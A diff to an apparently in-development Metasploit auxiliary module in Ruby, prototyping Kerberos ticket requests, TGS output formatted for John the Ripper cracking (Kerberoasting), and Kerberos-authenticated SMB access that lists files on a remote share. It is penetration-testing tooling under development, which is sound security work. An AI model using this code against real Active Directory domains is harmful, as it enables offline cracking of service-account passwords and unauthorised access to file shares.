@@ -163,6 +163,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
+  # Spike getting user spns
   def get_user_spns
     # fake ldap results
     service_user = 'fake_mysql'
@@ -191,12 +192,20 @@ class MetasploitModule < Msf::Auxiliary
     # Options: Forwardable | Renewable | Canonicalize | Renewable-ok
     options = 0x40810010
 
+    # TODO: From [MS-KILE]:
+    #     The subkey in the EncAPRepPart of the KRB_AP_REP message (defined in [RFC4120] section 5.5.2) is used as the
+    #     session key when MutualAuthentication is requested. When DES and RC4 are used, the implementation is as defined
+    #     in [RFC1964]. With DES and RC4, the subkey in the KRB_AP_REQ message can be used as the session key, as it is
+    #     the same as the subkey in KRB_AP_REP message. However, when AES is used (see [RFC4121]), the subkeys are different
+    #     and the subkey in the KRB_AP_REP message is used. (The KRB_AP_REQ message is defined in [RFC4120] section 5.5.1).
+    #   So for now, we set the subkey to nil
+    subkey = nil
+
     tgs_res = send_request_tgs(
       req: build_tgs_request(
         {
           session_key: tgt_result[:auth].key,
-          # Don't create a subkey, use the existing session key
-          subkey: nil,
+          subkey: subkey,
           checksum: nil,
           ticket: tgt_result[:ticket],
           realm: domain,
@@ -236,6 +245,7 @@ class MetasploitModule < Msf::Auxiliary
     print_good("#{peer} - MIT Credential Cache saved on #{path}")
   end
 
+  # Spike getting a tgt, creating a tgs for cifs/smb access, connecting + listing shares, and psexec
   def get_smb_test
     # Kerberos'ing
     print_status('Validating options...')
@@ -290,12 +300,20 @@ class MetasploitModule < Msf::Auxiliary
     # Options: Forwardable | Renewable | Canonicalize | Renewable-ok
     options = 0x40810010
 
+    # TODO: From [MS-KILE]:
+    #     The subkey in the EncAPRepPart of the KRB_AP_REP message (defined in [RFC4120] section 5.5.2) is used as the
+    #     session key when MutualAuthentication is requested. When DES and RC4 are used, the implementation is as defined
+    #     in [RFC1964]. With DES and RC4, the subkey in the KRB_AP_REQ message can be used as the session key, as it is
+    #     the same as the subkey in KRB_AP_REP message. However, when AES is used (see [RFC4121]), the subkeys are different
+    #     and the subkey in the KRB_AP_REP message is used. (The KRB_AP_REQ message is defined in [RFC4120] section 5.5.1).
+    #   So for now, we set the subkey to nil
+    subkey = nil
+
     tgs_res = send_request_tgs(
       req: build_tgs_request(
         {
           session_key: tgt_result[:auth].key,
-          # Don't create a subkey, use the existing session key
-          subkey: nil,
+          subkey: subkey,
           checksum: nil,
           ticket: tgt_result[:ticket],
           realm: domain,
@@ -304,10 +322,6 @@ class MetasploitModule < Msf::Auxiliary
 
           body: build_tgs_request_body(
             cname: nil,
-            # sname: build_server_name(
-            #   server_name: service_spn,
-            #   server_type: Rex::Proto::Kerberos::Model::NT_SRV_INST
-            # ),
             sname: Rex::Proto::Kerberos::Model::PrincipalName.new(
               name_type: Rex::Proto::Kerberos::Model::NT_SRV_INST,
               name_string: [
@@ -321,16 +335,17 @@ class MetasploitModule < Msf::Auxiliary
             # Specify nil to ensure the KDC uses the current time for the desired starttime of the requested ticket
             from: nil,
             till: expiry_time,
-            rtime: expiry_time,
+            rtime: nil,
 
             # certificate time
             ctime: now,
-            )
+          )
         }
       )
     )
 
     if tgs_res.msg_type == Rex::Proto::Kerberos::Model::KRB_ERROR
+      print_status("TGS for john:")
       print_error("#{tgs_res.error_code}")
     else
       puts format_tgs_rep_to_john(service_user, service_spn, tgs_res)
@@ -351,18 +366,18 @@ class MetasploitModule < Msf::Auxiliary
       include Msf::Exploit::Remote::Kerberos::Client::TgsRequest
     end.new
 
-    # require 'pry'; binding.pry
-
     smash = tgs_wrapper.build_smb_ap_request(
       session_key: tgs_auth.key,
-      # Don't create a subkey, use the existing session key
-      subkey: nil,
+      subkey: subkey,
       checksum: nil,
       ticket: tgs_ticket,
       realm: domain,
       client_name: client_name,
       options: options,
-      )
+
+      # Force the msgtype of the AP request to be 11 instead of 7
+      force_message_type_to_11: true
+    )
 
     status = client.authenticate(
       tgs_ticket: tgs_res.ticket,
@@ -370,7 +385,30 @@ class MetasploitModule < Msf::Auxiliary
       smash: smash.encode(hack_for_smb: true)
     )
     puts "#{protocol} : #{status}"
-    print_good "finished without crashing"
+
+    print_good "smb session opened without crashing"
+
+    begin
+      path = "\\\\#{datastore['RHOST']}\\my_share"
+      tree = client.tree_connect(path)
+      puts "Connected to #{path} successfully!"
+    rescue StandardError => e
+      puts "Failed to connect to #{path}: #{e.message}"
+      return
+    end
+
+    files = tree.list
+
+    print_status("share files files:")
+    files.each do |file|
+      create_time = file.create_time.to_datetime.to_s
+      access_time = file.last_access.to_datetime.to_s
+      change_time = file.last_change.to_datetime.to_s
+      file_name   = file.file_name.encode('UTF-8')
+
+      puts "\tFILE: #{file_name} SIZE(BYTES): #{file.end_of_file} SIZE_ON_DISK(BYTES): #{file.allocation_size} CREATED:#{create_time} ACCESSED:#{access_time} CHANGED:#{change_time}"
+    end
+
     # if protocol == 'SMB1'
     #   puts "Native OS: #{client.peer_native_os}"
     #   puts "Native LAN Manager: #{client.peer_native_lm}"
@@ -382,7 +420,6 @@ class MetasploitModule < Msf::Auxiliary
     # puts "FQDN of the forest: #{client.dns_tree_name}"
     # puts "Dialect: #{client.dialect}"
     # puts "OS Version: #{client.os_version}"
-
   end
 
   def run
